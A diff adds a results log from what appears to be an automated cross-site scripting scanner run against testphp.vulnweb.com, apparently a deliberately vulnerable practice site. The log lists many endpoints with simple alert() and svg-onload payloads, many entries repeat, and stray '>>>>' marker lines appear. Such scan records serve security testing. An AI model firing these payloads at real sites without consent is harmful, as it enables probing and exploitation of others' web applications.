@@ -1,0 +1,60 @@
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=1 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=3 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=4 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=6 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/artists.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/hpp/?pp=12 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/artists.php?artist=3 - Payload: <script>alert('XSS')</script>
+>>>>>>>>>>>>>>>>>>>>[XSS Found] http://testphp.vulnweb.com/categories.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/signup.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/login.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/hpp/ - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/guestbook.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/artists.php?artist=3 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=2 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/cart.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/disclaimer.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/artists.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/guestbook.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=3 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=2 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/artists.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=4 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=4 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=1 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/hpp/ - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/login.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/userinfo.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=3 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/cart.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/cart.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=1 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/disclaimer.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/guestbook.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?cat=2 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?artist=3 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/hpp/ - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?artist=3 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/categories.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/hpp/?pp=12 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/index.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/signup.php - Payload: <script>alert('XSS')</script>
+>>>>>>>>>>>>>>>>>>>>[XSS Found] http://testphp.vulnweb.com/index.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/categories.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/artists.php?artist=3 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=6 - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/userinfo.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/index.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/index.php - Payload: <script>alert('XSS')</script>
+[XSS Found] http://testphp.vulnweb.com/listproducts.php?artist=3 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/login.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/categories.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/signup.php - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/disclaimer.php - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/hpp/?pp=12 - Payload: <script>alert(111)</script>
+[XSS Found] http://testphp.vulnweb.com/product.php?pic=6 - Payload: "<svg onload=alert('XSS')>
+[XSS Found] http://testphp.vulnweb.com/userinfo.php - Payload: <script>alert(111)</script>
+>>>>>>>>>>>>>>>>>>>>
